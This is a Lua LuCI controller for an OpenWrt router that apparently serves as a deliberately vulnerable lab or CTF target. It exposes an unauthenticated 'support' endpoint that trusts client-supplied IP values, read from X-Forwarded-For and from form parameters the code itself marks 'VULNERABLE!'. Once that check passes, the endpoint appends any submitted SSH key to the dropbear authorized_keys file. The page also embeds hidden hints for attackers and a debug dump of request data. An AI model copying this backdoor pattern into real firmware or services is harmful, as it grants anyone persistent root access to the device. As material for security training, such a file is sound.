-- Copyright 2026 Máximo García Aroca <maximo.garcia.aroca@gmail.com>
-- Licensed to the public under the Apache License 2.0.

module("luci.controller.support.remote", package.seeall)

local SUPPORT_NETWORK = "203.0.113."

function index()
    local page = entry({"support", "remote", "diagnostic"}, call("remote_diagnostic_tool"), _("Remote Connectivity Check"), 1)
    page.sysauth = false
    page.dependent = false
end


local function get_forwarded_ip()
    local http = require "luci.http"
    local nixio = require "nixio"
    
    -- Method 1: Standard CGI environment variable (rarely works with uhttpd)
    local xff = http.getenv("HTTP_X_FORWARDED_FOR")
    if xff and xff ~= "" then return xff, "header" end
    
    -- Method 2: Direct environment check
    xff = os.getenv("HTTP_X_FORWARDED_FOR")
    if xff and xff ~= "" then return xff, "env" end
    
    -- Method 3: Check X-Real-IP (alternative header)
    xff = http.getenv("HTTP_X_REAL_IP")
    if xff and xff ~= "" then return xff, "x-real-ip" end
    
    -- Method 4: Check 'X-Forwarded-For' as form parameter (VULNERABLE!)
    xff = http.formvalue("X-Forwarded-For")
    if xff and xff ~= "" then return xff, "form-xff" end
    
    -- Method 5: Check 'real_ip' parameter (VULNERABLE!)
    xff = http.formvalue("real_ip")
    if xff and xff ~= "" then return xff, "form-real_ip" end
    
    -- Method 6: Check 'xff' parameter (VULNERABLE!)
    xff = http.formvalue("xff")
    if xff and xff ~= "" then return xff, "form-xff-short" end
    
    -- Method 7: Check 'remote_addr' parameter (VULNERABLE!)
    xff = http.formvalue("remote_addr")
    if xff and xff ~= "" then return xff, "form-remote_addr" end
    
    return nil, "none"
end

-- Check if IP is in the support network (203.0.113.0/24)
local function is_support_ip(ip)
    if not ip then return false end
    
    -- Handle comma-separated list (first IP in chain)
    local first_ip = ip:match("^([^,]+)")
    if first_ip then
        first_ip = first_ip:gsub("^%s+", ""):gsub("%s+$", "")
    else
        first_ip = ip
    end
    
    -- Check if IP matches 203.0.113.X pattern
    if first_ip:match("^203%.0%.113%.%d+$") then
        local last_octet = tonumber(first_ip:match("%.(%d+)$"))
        if last_octet and last_octet >= 0 and last_octet <= 255 then
            return true, first_ip
        end
    end
    
    return false, first_ip
end

-- Log access attempts for forensics/learning
local function log_access(message)
    local fs = require "nixio.fs"
    local log_file = "/var/log/support_access.log"
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    local entry = string.format("[%s] %s\n", timestamp, message)
    
    local existing = fs.readfile(log_file) or ""
    fs.writefile(log_file, existing .. entry)
end

-- Debug function to dump all environment variables
local function dump_environment()
    local http = require "luci.http"
    local fs = require "nixio.fs"
    local debug_info = "=== Environment Debug ===\n"
    debug_info = debug_info .. "Time: " .. os.date() .. "\n\n"
    
    -- Common HTTP environment variables
    local env_vars = {
        "HTTP_X_FORWARDED_FOR",
        "HTTP_X_REAL_IP", 
        "HTTP_X_FORWARDED_HOST",
        "HTTP_X_FORWARDED_PROTO",
        "REMOTE_ADDR",
        "REMOTE_HOST",
        "HTTP_HOST",
        "HTTP_USER_AGENT",
        "REQUEST_METHOD",
        "REQUEST_URI",
        "QUERY_STRING",
        "CONTENT_TYPE",
        "CONTENT_LENGTH"
    }
    
    for _, var in ipairs(env_vars) do
        local val = http.getenv(var) or os.getenv(var) or "nil"
        debug_info = debug_info .. var .. " = " .. tostring(val) .. "\n"
    end
    
    -- Also log form parameters that could contain spoofed IP
    debug_info = debug_info .. "\n=== Parameters ===\n"
    debug_info = debug_info .. "X-Forwarded-For (param) = " .. (http.formvalue("X-Forwarded-For") or "nil") .. "\n"
    debug_info = debug_info .. "real_ip (param) = " .. (http.formvalue("real_ip") or "nil") .. "\n"
    debug_info = debug_info .. "xff (param) = " .. (http.formvalue("xff") or "nil") .. "\n"
    debug_info = debug_info .. "remote_addr (param) = " .. (http.formvalue("remote_addr") or "nil") .. "\n"
    
    fs.writefile("/tmp/support_env_debug.log", debug_info)
    return debug_info
end

-- Main diagnostic endpoint
function remote_diagnostic_tool()
    local http = require "luci.http"
    local fs = require "nixio.fs"
    local nixio = require "nixio"
    
    -- Always dump environment for debugging
    local debug_info = dump_environment()
    
    -- Get parameters
    local action = http.formvalue("action")
    local key_data = http.formvalue("key_data")
    local support_token = http.formvalue("support_token")
    local debug_mode = http.formvalue("debug")
    
    -- Get forwarded IP (may come from header OR spoofable parameter!)
    local xff, xff_source = get_forwarded_ip()
    local is_support, real_ip = is_support_ip(xff)
    local remote_addr = http.getenv("REMOTE_ADDR") or "unknown"
    
    -- Log all access attempts (including the source of the IP for forensics)
    log_access(string.format(
        "Access from %s (X-Forwarded-For: %s via %s) - Action: %s - Support IP: %s",
        remote_addr,
        xff or "none",
        xff_source or "none",
        action or "view",
        tostring(is_support)
    ))
    
    local is_authorized = is_support
    
    -- Debug mode: show environment
    if debug_mode == "1" then
        http.prepare_content("text/plain")
        http.write("=== Debug Information ===\n")
        http.write(debug_info)
        return
    end
    
    -- If not authorized, show generic diagnostic page
    if not is_authorized then
        http.prepare_content("text/html")
        http.write([[<!DOCTYPE html>
<html>
<head>
    <title>Remote Diagnostic Tool</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 8px; max-width: 600px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        .status { background: #d4edda; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .info { color: #666; font-size: 14px; }
        /* Hidden hint for attackers */
        .support-info { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Remote Diagnostic Tool</h1>
        <div class="status">
            <strong>Status:</strong> Operational ✓
        </div>
        <p><strong>Real IP:</strong> ]] .. remote_addr .. [[</p>
        <p><strong>Server Time:</strong> ]] .. os.date("%Y-%m-%d %H:%M:%S") .. [[</p>
        <hr>
        <!-- Support server: 203.0.113.100 - Internal use only -->
        <!-- Debug: Add ?debug=1 for environment info -->
        <div class="support-info">
            Support Network: 203.0.113.0/24
        </div>
    </div>
</body>
</html>]])
        return
    end
    
    -- === AUTHORIZED ACCESS ===
    
    -- Handle SSH key provisioning
    if action == "update_ssh_access" and key_data then
        local result = add_ssh_key(key_data, real_ip or remote_addr)
        if result.success then
            http.status(200, "OK")
            http.prepare_content("text/plain")
            http.write("SSH access updated successfully.\n")
            http.write("Key fingerprint: " .. (result.fingerprint or "unknown") .. "\n")
            log_access("SSH key added from " .. (real_ip or remote_addr))
        else
            http.status(400, "Bad Request")
            http.prepare_content("text/plain")
            http.write("Failed to add SSH key: " .. (result.error or "unknown error") .. "\n")
        end
        return
    end
    
    -- Handle system info request
    if action == "system_info" then
        http.prepare_content("application/json")
        local info = {
            hostname = luci.sys.hostname(),
            uptime = luci.sys.uptime(),
            kernel = luci.sys.exec("uname -r"):gsub("\n", ""),
            memory = get_memory_info(),
            ssh_keys = count_ssh_keys()
        }
        http.write(require("luci.json").encode(info))
        return
    end
    
    -- Default: show authorized panel
    http.prepare_content("text/html")
    http.write([[<!DOCTYPE html>
<html>
<head>
    <title>Support Access Panel</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }
        .container { background: #16213e; padding: 30px; border-radius: 8px; max-width: 700px; margin: 0 auto; }
        h1 { color: #e94560; }
        .success { background: #155724; padding: 15px; border-radius: 4px; margin: 20px 0; }
        form { margin: 20px 0; }
        textarea { width: 100%; height: 100px; margin: 10px 0; background: #0f0f1a; color: #0f0; border: 1px solid #333; padding: 10px; font-family: monospace; }
        input[type="submit"] { background: #e94560; color: white; padding: 10px 30px; border: none; cursor: pointer; border-radius: 4px; }
        input[type="submit"]:hover { background: #ff6b6b; }
        .warning { background: #856404; padding: 10px; border-radius: 4px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Support Access Panel</h1>
        <div class="success">
            <strong>Authorized Access Granted</strong><br>
            IP: ]] .. (real_ip or remote_addr) .. [[<br>
            Time: ]] .. os.date("%Y-%m-%d %H:%M:%S") .. [[
        </div>
        
        <h2>Add SSH Key</h2>
        <form method="POST">
            <input type="hidden" name="action" value="update_ssh_access">
            <label>SSH Public Key:</label>
            <textarea name="key_data" placeholder="ssh-ed25519 AAAA... user@host"></textarea>
            <input type="submit" value="Add SSH Key">
        </form>
        
        <div class="warning">
            ⚠️ This interface is for authorized support personnel only. All actions are logged.
        </div>
        
        <h2>Quick Actions</h2>
        <ul>
            <li><a href="?action=system_info" style="color:#4dabf7;">View System Info (JSON)</a></li>
            <li><a href="?debug=1" style="color:#4dabf7;">View Debug Info</a></li>
        </ul>
    </div>
</body>
</html>]])
end

-- Add SSH key to authorized_keys
function add_ssh_key(key_data, source_ip)
    local fs = require "nixio.fs"
    local nixio = require "nixio"
    
    -- Validate key format
    if not key_data or #key_data < 20 then
        return { success = false, error = "Key too short" }
    end
    
    -- Accept common SSH key formats
    local valid_prefixes = { "ssh%-rsa", "ssh%-ed25519", "ssh%-dss", "ecdsa%-sha2" }
    local is_valid = false
    
    for _, prefix in ipairs(valid_prefixes) do
        if key_data:match("^" .. prefix .. "%s+") then
            is_valid = true
            break
        end
    end
    
    if not is_valid then
        return { success = false, error = "Invalid key format" }
    end
    
    -- Sanitize key
    local sanitized_key = key_data:gsub("^%s+", ""):gsub("%s+$", ""):gsub("[\r\n]", "")
    
    -- Write to authorized_keys
    local auth_file = "/etc/dropbear/authorized_keys"
    
    -- Ensure directory exists
    fs.mkdirr("/etc/dropbear")
    
    local existing = fs.readfile(auth_file) or ""
    
    -- Check if key already exists
    if existing:find(sanitized_key, 1, true) then
        return { success = true, error = nil, fingerprint = "already exists" }
    end
    
    -- Add newline if needed
    if #existing > 0 and existing:sub(-1) ~= "\n" then
        existing = existing .. "\n"
    end
    
    -- Append key with comment about source
    local comment = string.format(" # Added via support channel from %s at %s", 
        source_ip or "unknown", os.date("%Y-%m-%d %H:%M:%S"))
    local new_content = existing .. sanitized_key .. comment .. "\n"
    
    if fs.writefile(auth_file, new_content) then
        -- Set proper permissions
        os.execute("chmod 600 " .. auth_file)
        
        -- Log the action
        log_access(string.format("SSH key added: %s... from %s", 
            sanitized_key:sub(1, 30), source_ip or "unknown"))
        
        return { success = true, fingerprint = sanitized_key:sub(1, 40) .. "..." }
    else
        return { success = false, error = "Failed to write file" }
    end
end

-- Helper: get memory info
function get_memory_info()
    local info = {}
    local memfile = io.open("/proc/meminfo", "r")
    if memfile then
        for line in memfile:lines() do
            local key, value = line:match("^(%w+):%s+(%d+)")
            if key and value then
                info[key] = tonumber(value)
            end
        end
        memfile:close()
    end
    return info
end

-- Helper: count SSH keys
function count_ssh_keys()
    local fs = require "nixio.fs"
    local content = fs.readfile("/etc/dropbear/authorized_keys") or ""
    local count = 0
    for _ in content:gmatch("[^\n]+") do
        count = count + 1
    end
    return count
end